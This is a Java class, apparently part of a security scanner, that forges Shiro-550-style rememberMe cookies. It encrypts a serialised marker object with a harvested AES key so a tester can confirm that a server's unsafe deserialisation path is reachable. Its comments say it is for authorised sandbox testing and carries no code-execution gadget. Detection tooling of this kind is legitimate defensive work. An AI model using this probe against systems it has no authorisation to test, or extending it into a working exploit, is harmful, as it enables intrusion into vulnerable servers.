package com.aq.jvmsentinel.analysis.identity;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Objects;

/**
 * 沙箱授权范围内的 Shiro-550 风格 rememberMe cookie 构造。
 *
 * <p>使用 harvest 的 AES cipher key 加密可反序列化载荷；用于触发
 * {@code ObjectInputStream#readObject} / RememberMe 反序列化观测闭环。
 * 不保证登录成功，也不提供 RCE gadget——仅确认危险反序列化面被触达。
 */
public final class RememberMePayloadMinter {
    private static final SecureRandom RANDOM = new SecureRandom();

    private RememberMePayloadMinter() {
    }

    /**
     * @param cipherKeyBase64 Shiro {@code setCipherKey} Base64 材料
     * @return Base64 rememberMe cookie value，失败时返回 empty
     */
    public static String mintBase64CookieValue(String cipherKeyBase64) {
        Objects.requireNonNull(cipherKeyBase64, "cipherKeyBase64");
        String key = cipherKeyBase64.trim();
        if (key.isBlank()) {
            return "";
        }
        try {
            byte[] keyBytes = Base64.getDecoder().decode(key);
            if (keyBytes.length < 16) {
                return "";
            }
            byte[] serialized = serializeProbePrincipal();
            byte[] encrypted = aesCbcEncrypt(keyBytes, serialized);
            return Base64.getEncoder().encodeToString(encrypted);
        } catch (Exception ignored) {
            return "";
        }
    }

    public static String cookieHeader(String cookieName, String cipherKeyBase64) {
        String value = mintBase64CookieValue(cipherKeyBase64);
        if (value.isBlank()) {
            return "";
        }
        String name = cookieName == null || cookieName.isBlank() ? "rememberMe" : cookieName.trim();
        return name + "=" + value;
    }

    private static byte[] serializeProbePrincipal() throws Exception {
        // 最小 Serializable：Shiro AbstractRememberMeManager 解密后会进入 readObject。
        // 使用平台类型，避免控制面依赖 Shiro 类。
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ObjectOutputStream out = new ObjectOutputStream(buffer)) {
            out.writeObject(new ProbePrincipal("veyrion-rememberme-probe"));
        }
        return buffer.toByteArray();
    }

    private static byte[] aesCbcEncrypt(byte[] keyBytes, byte[] plaintext) throws Exception {
        byte[] key = new byte[16];
        System.arraycopy(keyBytes, 0, key, 0, Math.min(16, keyBytes.length));
        byte[] iv = new byte[16];
        RANDOM.nextBytes(iv);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
        byte[] cipherText = cipher.doFinal(plaintext);
        // Shiro AesCipherService wire：IV || ciphertext
        byte[] out = new byte[iv.length + cipherText.length];
        System.arraycopy(iv, 0, out, 0, iv.length);
        System.arraycopy(cipherText, 0, out, iv.length, cipherText.length);
        return out;
    }

    /** Marker principal for sandbox deserialization observation only. */
    public static final class ProbePrincipal implements Serializable {
        private static final long serialVersionUID = 1L;
        private final String name;

        public ProbePrincipal(String name) {
            this.name = name == null ? "" : name;
        }

        public String name() {
            return name;
        }

        @Override
        public String toString() {
            return "ProbePrincipal{" + name + "}";
        }
    }

    /** Test helper: decode key length without minting. */
    static int decodedKeyLength(String cipherKeyBase64) {
        try {
            return Base64.getDecoder().decode(cipherKeyBase64.trim()).length;
        } catch (Exception ignored) {
            return 0;
        }
    }

    static String utf8Preview(byte[] bytes) {
        return bytes == null ? "" : new String(bytes, StandardCharsets.US_ASCII);
    }
}
